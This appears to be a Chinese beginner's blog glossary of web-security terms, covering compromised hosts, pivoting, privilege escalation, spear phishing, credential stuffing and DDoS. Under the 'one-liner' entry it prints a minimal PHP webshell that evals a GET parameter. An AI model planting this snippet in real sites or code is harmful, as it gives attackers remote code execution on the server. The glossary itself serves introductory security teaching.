<h3 id="肉鸡"><a href="#肉鸡" class="headerlink" title="肉鸡"></a>肉鸡</h3><p>被黑客长期控制的计算机或者是服务器。</p>
<h3 id="一句话"><a href="#一句话" class="headerlink" title="一句话"></a>一句话</h3><p>用简短的一句话来实现webshell功能的脚本，比如说我们来个最简单的php一句话。</p>
<pre><code>&lt;?php

    eval($_GET[cmd])

?&gt;</code></pre><h3 id="跳板"><a href="#跳板" class="headerlink" title="跳板"></a>跳板</h3><p>通常我们在进行测试的时候往往需要尽量隐藏自己的身份，这时候我们就要做一些工作来隐藏自己，比如说用肉鸡的ip,或者挂梯子。</p>
<h3 id="旁站入侵"><a href="#旁站入侵" class="headerlink" title="旁站入侵"></a>旁站入侵</h3><p>通常我们在进行渗透测试的时候，直接对主站测试比较麻烦，且主站往往安全性比较高，在服务器上可能有好几个网站，这时候我们去扫描它的旁站，可能会得到我们意想不到的结果。</p>
<h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><p>往往我们在入侵成功的时候会得到一个权限比较低的用户，把权限比较低的用户变成权限比较高的用户的过程就叫提权，这个我们往往需要利用一些漏洞。</p>
<h3 id="白帽子，黑帽子，灰帽子"><a href="#白帽子，黑帽子，灰帽子" class="headerlink" title="白帽子，黑帽子，灰帽子"></a>白帽子，黑帽子，灰帽子</h3><p>白帽子通常来说是指那些利用技术遵纪守法的网络安全人员，黑帽子恰恰跟白帽子相反，他们往往会利用技术进行一些违法的事情。灰帽子介于两者之间，时好时坏。</p>
<h3 id="社工"><a href="#社工" class="headerlink" title="社工"></a>社工</h3><p>社工即指社会工程学，在许多时候我们在进行攻击啥的时候，往往需要与当事人接触，这时候往往就需要社工手段。利用人性的弱点来协助攻击。</p>
<h3 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h3><p>有效载荷，被隐藏并且秘密发送的信息 ，通俗点的来说就是安全测试数据。</p>
<h3 id="WAF"><a href="#WAF" class="headerlink" title="WAF"></a>WAF</h3><p>Web应用防护系统（也称为：网站应用级入侵防御系统。英文：Web Application Firewall，简称： WAF）。可以理解为运行在应用层的防火墙。</p>
<h3 id="CDN"><a href="#CDN" class="headerlink" title="CDN"></a>CDN</h3><p>CDN的全称是Content Delivery Network，即内容分发网络。CDN是构建在网络之上的内容分发网络，依靠部署在各地的边缘服务器，通过中心平台的负载均衡、内容分发、调度等功能模块，使用户就近获取所需内容，降低网络拥塞，提高用户访问响应速度和命中率。通俗的来说就是为了提高网站访问速度而设立的一些节点。</p>
<h3 id="鱼叉攻击"><a href="#鱼叉攻击" class="headerlink" title="鱼叉攻击"></a>鱼叉攻击</h3><p>“鱼叉攻击”是黑客攻击方式之一，最常见的做法是，将木马程序作为电子邮件的附件，并起上一个极具诱惑力的名称，发送给目标电脑，诱使受害者打开附件，从而感染木马。 总的来说就是钓鱼。</p>
<h3 id="安全基线"><a href="#安全基线" class="headerlink" title="安全基线"></a>安全基线</h3><p>安全基线，是借用“基线”的概念。字典上对“基线”的解释是：一种在测量、计算或定位中的基本参照。如海岸基线，是水位到达的水位线。类比于“木桶理论”，可以认为安全基线是安全木桶的最短板，或者说，是最低的安全要求。</p>
<h3 id="弱口令"><a href="#弱口令" class="headerlink" title="弱口令"></a>弱口令</h3><p>非常简单的口令，或者是说那些默认的大家都知道的口令，比如说123456，password等这些简单的密码。</p>
<h3 id="脱库"><a href="#脱库" class="headerlink" title="脱库"></a>脱库</h3><p>注意这个不是脱裤，不是脱裤子！是脱掉网站的数据库。</p>
<h3 id="撞库"><a href="#撞库" class="headerlink" title="撞库"></a>撞库</h3><p>就是这么来说吧，你在A网站的账号demo，密码123456。但是这个信息被泄露了，黑客搜集了好多跟你一样，喜欢在好多网站用用户名跟密码一样的人的账号密码信息，然后尝试去登录其他网站。</p>
<h3 id="端口"><a href="#端口" class="headerlink" title="端口"></a>端口</h3><p>“端口”是英文port的意译，可以认为是设备与外界通讯交流的出口。比如说我们常见的</p>
<p>21 ftp</p>
<p>80 http</p>
<p>3389 远程桌面</p>
<h3 id="DDOS"><a href="#DDOS" class="headerlink" title="DDOS"></a>DDOS</h3><p>分布式拒绝服务(DDoS:Distributed Denial of Service)攻击指借助于客户/服务器技术，将多个计算机联合起来作为攻击平台，对一个或多个目标发动DDoS攻击，从而成倍地提高拒绝服务攻击的威力。比如说举个栗子，从A地去B地有三条道路，这三条道路每次都只能过一辆车，有三个不怀好意的家伙，开车在这三条路上不走，其他的想前往B地的人过不去，从而导致阻塞。差不多就是这个意思。</p>
<h3 id="嗅探"><a href="#嗅探" class="headerlink" title="嗅探"></a>嗅探</h3><p>捕获网络中传输的数据，比如说抓包。</p>
<h3 id="OWASP"><a href="#OWASP" class="headerlink" title="OWASP"></a>OWASP</h3><p>开放式Web应用程序安全项目（OWASP，Open Web Application Security Project）是一个组织，它提供有关计算机和互联网应用程序的公正、实际、有成本效益的信息。其目的是协助个人、企业和机构来发现和使用可信赖软件。每年都会评估owasp top10来总结10个常见的web攻击方式。</p>
<h2 id="小节"><a href="#小节" class="headerlink" title="小节"></a>小节</h2><p> 以上介绍了一些WEB安全入门的基本名词，希望可以帮到在入门过程中迷茫的同学，由于作者个人能力不是很高，不足之处还望大家理解指点。</p>
]]></content>
      <categories>
        <category>web入门文章</category>
      </categories>
      <tags>
        <tag>web入门</tag>
      </tags>
  </entry>
</search>
